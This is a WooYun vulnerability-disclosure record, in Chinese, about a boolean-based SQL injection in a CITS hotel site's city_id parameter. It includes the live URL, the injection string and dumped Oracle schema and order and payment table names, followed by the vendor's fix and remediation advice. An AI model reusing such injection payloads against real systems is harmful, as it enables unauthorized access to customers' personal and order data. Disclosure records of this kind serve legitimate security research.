{"id": 32632, "wybug_id": "wooyun-2015-0110723", "wybug_title": "中国国旅某站Oracle注入（泄露大量敏感信息例如订单）", "wybug_corp": "中国国旅", "wybug_author": "大懒", "wybug_date": "2015-04-28 10:07", "wybug_open_date": "2015-05-14 10:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-14：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 中国国旅某站Oracle注入 详细说明：  URL：http://hotel.cits.cn/hotel/detail/35.html?city_id=存在问题的参数city_id这里存在的问题是布尔注入'%20and%20'x'='xavailable databases [10]:[*] CITSONLINE[*] DBSNMP[*] GGADMIN[*] OMWB_EMULATION[*] OUTLN[*] SYS[*] SYSTEM[*] TSMSYS[*] VERIFY[*] WMSYS这里第一个数据库挺重要的，里面有大量的表ACCEPT_TAB 这个表有100多万CUSTOMERCUSTOM_INFO应该存着顾客信息ORDER_ALARM                    || ORDER_ALARM_VER                || ORDER_ALARM_WEB                || ORDER_ANSWER                   || ORDER_ANSWER_HIS               || ORDER_COST                     || ORDER_COST_INFO                || ORDER_CUMCENT                  || ORDER_CUMCENT_HIS              || ORDER_CWNO                     || ORDER_DZ                       || ORDER_FLOW_HIS_INFO            || ORDER_FLOW_INFO                || ORDER_FUNC                     || ORDER_INFO                     || ORDER_INFO_BAK                 || ORDER_INFO_HIS                 || ORDER_INTENT                   || ORDER_INTENT_HIS               || ORDER_SUPP_ACCEPT_APP_INFO     || ORDER_SUPP_ACCEPT_INFO         || ORDER_SUPP_PAY_APP_INFO        || ORDER_SUPP_PAY_INFO            || ORDER_TEMPLATE                 || ORDER_TICKET_RELATION          || OREDER_ACCEPT_TAB              || OREDER_PAY_TAB                 || PAY                            || PAYBUFFER                      || PAYMENT_ADD                    |很多订单 支付的表   漏洞证明：  如上   修复方案：  1.过滤2.结构化构造sql查询语句，数据流和代码流分离   版权声明：转载请注明来源 大懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-29 16:23 厂商回复： 非常感谢您的报告，问题已处理,十分感谢您对中国国旅的支持。 最新状态： 2015-05-14：已采用结构化SQL语句，并针对post参数做了过滤  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}